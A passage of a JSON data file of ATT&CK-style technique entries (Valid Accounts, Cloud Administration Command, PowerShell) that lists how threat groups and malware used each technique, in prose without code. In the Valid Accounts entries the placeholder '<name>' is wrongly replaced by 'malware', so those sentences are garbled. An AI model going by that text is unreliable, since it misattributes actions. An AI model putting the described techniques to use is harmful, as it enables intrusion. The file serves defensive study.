                        "Description": "<name> can use stolen service account tokens to perform its operations.[13]"
                    },
                    "S0684": {
                        "ID": "S0684",
                        "Name": "ROADTools",
                        "Description": "<name> leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API.[14]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used a compromised O365 administrator account to create a new Service Principal.[15]"
                    }
                }
            }
        },
        "tactic": "Defense Evasion",
        "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1] Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
        "Procedure": {
            "C0028": {
                "ID": "C0028",
                "Name": "2015 Ukraine Electric Power Attack",
                "Description": "During the malware, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [4]"
            },
            "G1024": {
                "ID": "G1024",
                "Name": "Akira",
                "Description": "malware uses valid account information to remotely access victim networks, such as VPN credentials.[5][6]"
            },
            "G0026": {
                "ID": "G0026",
                "Name": "APT18",
                "Description": "malware actors leverage legitimate credentials to log into external remote services.[7]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware has used legitimate credentials to gain initial access, maintain access, and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone, printer, and video decoder.[8][9][10][11]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used a compromised account to access an organization's VPN infrastructure.[12]"
            },
            "G0064": {
                "ID": "G0064",
                "Name": "APT33",
                "Description": "malware has used valid accounts for initial access and privilege escalation.[13][14]"
            },
            "G0087": {
                "ID": "G0087",
                "Name": "APT39",
                "Description": "malware has used stolen credentials to compromise Outlook Web Access (OWA).[15]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used compromised credentials to log on to other systems.[16][17]"
            },
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has used previously compromised administrative accounts to escalate privileges.[18]"
            },
            "C0032": {
                "ID": "C0032",
                "Name": "C0032",
                "Description": "During the malware campaign, TEMP.Veles used compromised VPN accounts.[19]"
            },
            "G0008": {
                "ID": "G0008",
                "Name": "Carbanak",
                "Description": "malware actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.[20]"
            },
            "G0114": {
                "ID": "G0114",
                "Name": "Chimera",
                "Description": "malware has used a valid account to maintain persistence via scheduled task.[21]"
            },
            "G1021": {
                "ID": "G1021",
                "Name": "Cinnamon Tempest",
                "Description": "malware has used compromised user accounts to deploy payloads and create system services.[22]"
            },
            "G0035": {
                "ID": "G0035",
                "Name": "Dragonfly",
                "Description": "malware has compromised user credentials and used valid accounts for operations.[23][24][25]"
            },
            "S0567": {
                "ID": "S0567",
                "Name": "Dtrack",
                "Description": "malware used hard-coded credentials to gain access to a network share.[26]"
            },
            "S0038": {
                "ID": "S0038",
                "Name": "Duqu",
                "Description": "Adversaries can instruct malware to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.[27]"
            },
            "G0051": {
                "ID": "G0051",
                "Name": "FIN10",
                "Description": "malware has used stolen credentials to connect remotely to victim networks using VPNs protected with only a single factor.[28]"
            },
            "G0085": {
                "ID": "G0085",
                "Name": "FIN4",
                "Description": "malware has used legitimate credentials to hijack email communications.[29][30]"
            },
            "G0053": {
                "ID": "G0053",
                "Name": "FIN5",
                "Description": "malware has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment.[31][32][33]"
            },
            "G0037": {
                "ID": "G0037",
                "Name": "FIN6",
                "Description": "To move laterally on a victim network, malware has used credentials stolen from various systems on which it gathered usernames and password hashes.[34][35][36]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware has harvested valid administrative credentials for lateral movement.[37]"
            },
            "G0061": {
                "ID": "G0061",
                "Name": "FIN8",
                "Description": "malware has used valid accounts for persistence and lateral movement.[38]"
            },
            "G0117": {
                "ID": "G0117",
                "Name": "Fox Kitten",
                "Description": "malware has used valid credentials with various services during lateral movement.[39]"
            },
            "G0093": {
                "ID": "G0093",
                "Name": "GALLIUM",
                "Description": "malware leveraged valid accounts to maintain access to a victim network.[40]"
            },
            "S0604": {
                "ID": "S0604",
                "Name": "Industroyer",
                "Description": "malware can use supplied user credentials to execute processes and stop services.[41]"
            },
            "G0004": {
                "ID": "G0004",
                "Name": "Ke3chang",
                "Description": "malware has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts.[42]"
            },
            "S0599": {
                "ID": "S0599",
                "Name": "Kinsing",
                "Description": "malware has used valid SSH credentials to access remote hosts.[43]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs.[44][45]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware has used administrator credentials to gain access to restricted network segments.[46]"
            },
            "G0065": {
                "ID": "G0065",
                "Name": "Leviathan",
                "Description": "malware has obtained valid accounts to gain initial access.[47][48]"
            },
            "S0362": {
                "ID": "S0362",
                "Name": "Linux Rabbit",
                "Description": "malware acquires valid SSH accounts through brute force. [49]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used valid accounts including shared between Managed Service Providers and clients to move between the two environments.[50][51][52][53]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used compromised VPN accounts to gain access to victim systems.[54]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware has used compromised credentials to access other systems on a victim network.[55][56][17]"
            },
            "C0014": {
                "ID": "C0014",
                "Name": "Operation Wocao",
                "Description": "During malware, threat actors used valid VPN credentials to gain initial access.[57]"
            },
            "G0011": {
                "ID": "G0011",
                "Name": "PittyTiger",
                "Description": "malware attempts to obtain legitimate credentials during operations.[58]"
            },
            "G1005": {
                "ID": "G1005",
                "Name": "POLONIUM",
                "Description": "malware has used valid compromised credentials to gain access to victim environments.[59]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware have used previously acquired legitimate credentials prior to attacks.[60]"
            },
            "S0053": {
                "ID": "S0053",
                "Name": "SeaDuke",
                "Description": "Some malware samples have a module to extract email from Microsoft Exchange servers using compromised credentials.[61]"
            },
            "G0091": {
                "ID": "G0091",
                "Name": "Silence",
                "Description": "malware has used compromised credentials to log on to other systems and escalate privileges.[62]"
            },
            "G0122": {
                "ID": "G0122",
                "Name": "Silent Librarian",
                "Description": "malware has used compromised credentials to obtain unauthorized access to online accounts.[63]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 used different compromised credentials for remote access and to move laterally.[64][65][66]"
            },
            "G0039": {
                "ID": "G0039",
                "Name": "Suckfly",
                "Description": "malware used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner.[67]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.[68]"
            },
            "G0102": {
                "ID": "G0102",
                "Name": "Wizard Spider",
                "Description": "malware has used valid credentials for privileged accounts with the goal of accessing domain controllers.[69][70]"
            }
        }
    },
    "T1651": {
        "ttp_name": "Cloud Administration Command",
        "ttp_id": "T1651",
        "href": "/techniques/T1651",
        "tactic": "Execution",
        "description": "Adversaries may abuse cloud management services to execute commands within virtual machines. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. [1][2]If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment\u2019s virtual machines. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines.[3]",
        "Procedure": {
            "S0677": {
                "ID": "S0677",
                "Name": "AADInternals",
                "Description": "malware can execute commands on Azure virtual machines using the VM agent.[4]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used Azure Run Command and Azure Admin-on-Behalf-of (AOBO) to execute code on virtual machines.[3]"
            },
            "S1091": {
                "ID": "S1091",
                "Name": "Pacu",
                "Description": "malware can run commands on EC2 instances using AWS Systems Manager Run Command.[5]"
            }
        }
    },
    "T1059": {
        "ttp_name": "Command and Scripting Interpreter",
        "ttp_id": "T1059",
        "href": "/techniques/T1059",
        "subtechnique": {
            "001": {
                "name": "PowerShell",
                "href": "/techniques/T1059/001",
                "description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[1] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.A number of PowerShell-based offensive testing tools are available, including Empire,  PowerSploit, PoshC2, and PSAttack.[2]PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).[3][4][5]",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[6]"
                    },
                    "C0034": {
                        "ID": "C0034",
                        "Name": "2022 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.[7]"
                    },
                    "S0677": {
                        "ID": "S0677",
                        "Name": "AADInternals",
                        "Description": "<name> is written and executed via PowerShell.[8]"
                    },
                    "S1129": {
                        "ID": "S1129",
                        "Name": "Akira",
                        "Description": "<name> will execute PowerShell commands to delete system volume shadow copies.[9]"
                    },
                    "S0622": {
                        "ID": "S0622",
                        "Name": "AppleSeed",
                        "Description": "<name> has the ability to execute its payload via PowerShell.[10]"
                    },
                    "G0073": {
                        "ID": "G0073",
                        "Name": "APT19",
                        "Description": "<name> used PowerShell commands to execute payloads.[11]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> downloads and executes PowerShell scripts and performs PowerShell commands.[12][13][14]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used encoded PowerShell scripts uploaded to CozyCar installations to download and install SeaDuke.[15][16][17][18]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> has used PowerShell on victim systems to download and run payloads after exploitation.[19]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used PowerShell-based tools, PowerShell one-liners, and shellcode loaders for execution.[20][21][22]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has utilized PowerShell to download files from the C2 server and run various scripts. [23][24]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used PowerShell to execute commands and other operational tasks.[25]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has used PowerShell to execute malicious code.[26][27]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> leveraged PowerShell to deploy malware families in victims\u2019 environments.[28][29]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used PowerShell to accomplish tasks within targeted environments.[30]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has downloaded additional scripts and executed Base64 encoded commands in PowerShell.[31]"
                    },
                    "S0129": {
                        "ID": "S0129",
                        "Name": "AutoIt backdoor",
                        "Description": "<name> downloads a PowerShell script that decodes to a typical shellcode loader.[32]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can utilize powershell.exe to execute commands on a compromised host.[33][34]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> has used PowerShell loaders as part of execution.[35]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can execute a PowerShell script received from C2.[36][37]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> has used PowerShell scripts for discovery and to execute files over the network.[38][39][40]"
                    },
                    "S0521": {
                        "ID": "S0521",
                        "Name": "BloodHound",
                        "Description": "<name> can use PowerShell to pull Active Directory information from the target environment.[41]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used PowerShell reverse TCP shells to issue interactive commands over a network connection.[42]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> is written in PowerShell.[43][44]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used PowerShell for execution.[45]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can use PowerShell for execution.[46]"
                    },
                    "C0018": {
                        "ID": "C0018",
                        "Name": "C0018",
                        "Description": "During <name>, the threat actors used encoded PowerShell scripts for execution.[47][48]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors used obfuscated PowerShell to extract an encoded payload from within an .LNK file.[49][50]"
                    },
                    "C0032": {
                        "ID": "C0032",
                        "Name": "C0032",
                        "Description": "During the <name> campaign, TEMP.Veles used PowerShell to perform timestomping.[51]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "<name> can use PowerShell for payload execution and C2 communication.[52]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.[53][54]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has used PowerShell to communicate with C2, download files, and execute reconnaissance commands.[55]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "The <name> dropper can use PowerShell to download the malware.[56]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used powershell.exe to download and execute scripts.[57][58][59][60][61][62]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can execute a payload on a remote host with PowerShell. This technique does not write any data to disk.[63][64] <name> can also use PowerSploit and other scripting frameworks to perform execution.[65][66][67][68]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used PowerShell to load itself every time a user logs in to the system. <name> can execute PowerShell scripts loaded into memory or from the file system.[69][70]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has used PowerShell to execute malicious files and payloads.[71]"
                    },
                    "S0591": {
                        "ID": "S0591",
                        "Name": "ConnectWise",
                        "Description": "<name> can be used to execute PowerShell commands on target machines.[72]"
                    },
                    "G0052": {
                        "ID": "G0052",
                        "Name": "CopyKittens",
                        "Description": "<name> has used PowerShell Empire.[73]"
                    },
                    "S0488": {
                        "ID": "S0488",
                        "Name": "CrackMapExec",
                        "Description": "<name> can execute PowerShell commands via WMI.[74]"
                    },
                    "S1023": {
                        "ID": "S1023",
                        "Name": "CreepyDrive",
                        "Description": "<name> can use Powershell for execution, including the cmdlets Invoke-WebRequest and Invoke-Expression.[75]"
                    },
                    "S1024": {
                        "ID": "S1024",
                        "Name": "CreepySnail",
                        "Description": "<name> can use PowerShell for execution, including the cmdlets Invoke-WebRequst and Invoke-Expression.[75]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> has been dropped onto systems and used for lateral movement via obfuscated PowerShell scripts.[76]"
                    },
                    "G0079": {
                        "ID": "G0079",
                        "Name": "DarkHydrus",
                        "Description": "<name> leveraged PowerShell to download and execute additional scripts for execution.[77][78]"
                    },
                    "G0105": {
                        "ID": "G0105",
                        "Name": "DarkVishnya",
                        "Description": "<name> used PowerShell to create shellcode loaders.[79]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can execute PowerShell commands and has used PowerShell to execute a keylogger.[80]"
                    },
                    "G0009": {
                        "ID": "G0009",
                        "Name": "Deep Panda",
                        "Description": "<name> has used PowerShell scripts to download and execute programs in memory, without writing to disk.[81]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> has a version written in PowerShell.[22]"
                    },
                    "S0695": {
                        "ID": "S0695",
                        "Name": "Donut",
                        "Description": "<name> can generate shellcode outputs that execute via PowerShell.[82]"
                    },
                    "S0186": {
                        "ID": "S0186",
                        "Name": "DownPaper",
                        "Description": "<name> uses PowerShell for execution.[83]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used PowerShell scripts for execution.[84][85]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has used PowerShell to execute commands.[86]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has used an encoded PowerShell command by a service created by Cobalt Strike for lateral movement.[87]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has used PowerShell to download and execute malicious code.[88]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has used Powershell to retrieve the malicious payload and download additional resources like Mimikatz. [89][90][91][92][93]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> leverages PowerShell for the majority of its client-side agent tasks. <name> also contains the ability to conduct PowerShell remoting with the Invoke-PSRemoting module.[94][95]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> has the ability to execute PowerShell scripts.[96]"
                    },
                    "S0679": {
                        "ID": "S0679",
                        "Name": "Ferocious",
                        "Description": "<name> can use PowerShell scripts for execution.[97]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> uses PowerShell for execution as well as PowerShell Empire to establish persistence.[98][94]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used PowerShell commands to obtain DNS data from a compromised network.[99]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used PowerShell to gain access to merchant's networks, and a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.[100][101][102]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used a PowerShell script to launch shellcode that retrieved an additional payload.[103][104][105][106]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name>'s malicious spearphishing payloads are executed as PowerShell. <name> has also used PowerShell for lateral movement and credential access.[107][108][109][110]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has used PowerShell to execute commands.[111]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used PowerShell scripts to access credential data.[112]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors used PowerShell to run a series of Base64-encoded commands that acted as a stager and enumerated hosts.[113]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used PowerShell for execution to assist in lateral movement as well as for dumping credentials stored on compromised machines.[114]"
                    },
                    "G0084": {
                        "ID": "G0084",
                        "Name": "Gallmaker",
                        "Description": "<name> used PowerShell to download additional payloads and for execution.[115]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used obfuscated PowerShell scripts for staging.[116]"
                    },
                    "S1117": {
                        "ID": "S1117",
                        "Name": "GLASSTOKEN",
                        "Description": "<name> can use PowerShell for command execution.[117]"
                    },
                    "G0115": {
                        "ID": "G0115",
                        "Name": "GOLD SOUTHFIELD",
                        "Description": "<name> has staged and executed PowerShell scripts on compromised hosts.[118]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can use PowerShell commands to download and execute a payload and open a decoy document on the victim\u2019s machine.[119]"
                    },
                    "S0417": {
                        "ID": "S0417",
                        "Name": "GRIFFON",
                        "Description": "<name> has used PowerShell to execute the Meterpreter downloader TinyMet.[120]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data.[121][122]"
                    },
                    "S0151": {
                        "ID": "S0151",
                        "Name": "HALFBAKED",
                        "Description": "<name> can execute PowerShell scripts.[103]"
                    },
                    "S0037": {
                        "ID": "S0037",
                        "Name": "HAMMERTOSS",
                        "Description": "<name> is known to use PowerShell.[123]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name> has used PowerShell to execute commands.[124]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "One version of <name> uses a PowerShell script.[125]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has used PowerShell-based tools and scripts for discovery and collection on compromised hosts.[126][127][128]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has used PowerShell to execute malicious commands and payloads.[129][130]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has used PowerShell Empire for execution of malware.[131][132]"
                    },
                    "S0389": {
                        "ID": "S0389",
                        "Name": "JCry",
                        "Description": "<name> has used PowerShell to execute payloads.[133]"
                    },
                    "S0648": {
                        "ID": "S0648",
                        "Name": "JSS Loader",
                        "Description": "<name> has the ability to download and execute PowerShell scripts.[134]"
                    },
                    "S0387": {
                        "ID": "S0387",
                        "Name": "KeyBoy",
                        "Description": "<name> uses PowerShell commands to download and execute payloads.[135]"
                    },
                    "S0526": {
                        "ID": "S0526",
                        "Name": "KGH_SPY",
                        "Description": "<name> can execute PowerShell commands on the victim's machine.[136]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has executed a variety of PowerShell scripts.[137][138][139][140]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has used PowerShell to establish persistence.[141]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> has used PowerShell commands to download additional files.[141]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "<name> used PowerShell to download and execute a specific 64-bit version of the malware.[142][143]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used PowerShell to execute commands and malicious code.[144]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has used PowerShell scripts to execute malicious code.[141]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used PowerShell for execution.[145][146][147][148]"
                    },
                    "S0680": {
                        "ID": "S0680",
                        "Name": "LitePower",
                        "Description": "<name> can use a PowerShell script to execute commands.[97]"
                    },
                    "S0681": {
                        "ID": "S0681",
                        "Name": "Lizar",
                        "Description": "<name> has used PowerShell scripts.[149]"
                    },
                    "S0447": {
                        "ID": "S0447",
                        "Name": "Lokibot",
                        "Description": "<name> has used PowerShell commands embedded inside batch scripts.[150]"
                    },
                    "S1060": {
                        "ID": "S1060",
                        "Name": "Mafalda",
                        "Description": "<name> can execute PowerShell commands on a compromised machine.[151]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used PowerShell for execution and privilege escalation.[152][153][154][155][156]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> uses PowerSploit to inject shellcode into PowerShell.[157][158]"
                    },
                    "S0688": {
                        "ID": "S0688",
                        "Name": "Meteor",
                        "Description": "<name> can use PowerShell commands to disable the network adapters on a victim machines.[159]"
                    },
                    "S0553": {
                        "ID": "S0553",
                        "Name": "MoleNet",
                        "Description": "<name> can use PowerShell to set persistence.[160]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> used PowerShell implants on target machines.[161]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> can launch PowerShell Scripts.[162]"
                    },
                    "G1019": {
                        "ID": "G1019",
                        "Name": "MoustachedBouncer",
                        "Description": "<name> has used plugins to execute PowerShell scripts.[163]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has used PowerShell for execution.[164][165][166][167][168][169][170][171][172][173]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has used malicious PowerShell scripts to enable execution.[174][175]"
                    },
                    "S0457": {
                        "ID": "S0457",
                        "Name": "Netwalker",
                        "Description": "<name> has been written in PowerShell and executed directly in memory, avoiding detection.[176][177]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "The <name> binary has been executed via PowerShell script.[178]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has executed PowerShell commands via auto-run registry key persistence.[179]"
                    },
                    "G0133": {
                        "ID": "G0133",
                        "Name": "Nomadic Octopus",
                        "Description": "<name> has used PowerShell for execution.[180]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used PowerShell scripts for execution, including use of a macro to run a PowerShell command to decode file contents.[43][181][182]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used PowerShell commands to explore the environment of compromised victims.[183]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used PowerShell on compromised systems.[184]"
                    },
                    "S0352": {
                        "ID": "S0352",
                        "Name": "OSX_OCEANLOTUS.D",
                        "Description": "<name> uses PowerShell scripts.[185]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> used PowerSploit to download payloads, run a reverse shell, and execute malware on the victim's machine.[186][187]"
                    },
                    "S0517": {
                        "ID": "S0517",
                        "Name": "Pillowmint",
                        "Description": "<name> has used a PowerShell script to install a shim database.[188]"
                    },
                    "G0033": {
                        "ID": "G0033",
                        "Name": "Poseidon Group",
                        "Description": "The <name>'s Information Gathering Tool (IGT) includes PowerShell components.[189]"
                    },
                    "S0150": {
                        "ID": "S0150",
                        "Name": "POSHSPY",
                        "Description": "<name> uses PowerShell to execute various commands, one to execute its payload.[190]"
                    },
                    "S1012": {
                        "ID": "S1012",
                        "Name": "PowerLess",
                        "Description": "<name> is written in and executed via PowerShell without using powershell.exe.[191]"
                    },
                    "S0685": {
                        "ID": "S0685",
                        "Name": "PowerPunch",
                        "Description": "<name> has the ability to execute through PowerShell.[116]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> is a backdoor written in PowerShell.[129]"
                    },
                    "S0145": {
                        "ID": "S0145",
                        "Name": "POWERSOURCE",
                        "Description": "<name> is a PowerShell backdoor.[192][193]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name> modules are written in and executed via PowerShell.[194][195]"
                    },
                    "S0393": {
                        "ID": "S0393",
                        "Name": "PowerStallion",
                        "Description": "<name> uses PowerShell loops to iteratively check for available commands in its OneDrive C2 server.[196]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> uses PowerShell for obfuscation and execution.[197][168][198][172]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> is written in PowerShell.[199]"
                    },
                    "S1046": {
                        "ID": "S1046",
                        "Name": "PowGoop",
